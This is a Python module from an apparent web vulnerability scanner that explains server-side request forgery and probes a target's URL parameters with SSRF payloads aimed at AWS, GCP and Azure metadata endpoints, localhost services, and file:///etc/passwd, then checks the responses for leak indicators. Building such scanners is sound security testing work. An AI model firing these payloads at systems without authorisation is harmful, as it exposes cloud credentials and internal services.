"""
SSRF - Server-Side Request Forgery
====================================
WHAT IS SSRF?
  SSRF tricks the server into making HTTP requests to internal or external
  resources that attackers specify. E.g. fetching http://169.254.169.254/
  (AWS metadata) from a cloud server.

WHY DANGEROUS?
  Can expose cloud credentials, internal services, bypass firewalls.

FIX: Whitelist allowed URLs, block internal IP ranges, use egress filtering.
REFERENCE: https://portswigger.net/web-security/ssrf
"""

from modules.base import BaseScanner
from utils.helpers import safe_get, extract_params, inject_param

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/", # GCP metadata
    "http://169.254.169.254/metadata/v1/",                 # Azure metadata
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://10.0.0.1/",
    "dict://localhost:6379/info",
    "file:///etc/passwd",
    "gopher://localhost:3306/",
]

SSRF_INDICATORS = [
    "ami-id", "instance-id", "iam", "metadata",  # AWS
    "computeMetadata", "project-id",              # GCP
    "root:x:0:0",                                 # /etc/passwd
    "+PONG",                                       # Redis
]

class SSRFScanner(BaseScanner):
    NAME = "SSRF Scanner"

    def run(self):
        self.log("Testing for SSRF via URL parameters...")
        params = extract_params(self.target) or ["url", "src", "dest", "redirect", "uri",
                                                  "path", "continue", "return", "next",
                                                  "data", "reference", "site", "html",
                                                  "val", "validate", "domain", "callback",
                                                  "return_url", "image"]
        for payload in SSRF_PAYLOADS:
            for param in params:
                test_url = inject_param(self.target, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text.lower()
                for indicator in SSRF_INDICATORS:
                    if indicator.lower() in body:
                        self.add_finding(
                            f"SSRF confirmed! Param: {param} | Payload: {payload} | Indicator: {indicator}"
                        )
                        self.log(f"SSRF via {param}", "vuln")
                        return self.result(True, f"SSRF found via param '{param}'")

        return self.result(False, "No SSRF indicators found")
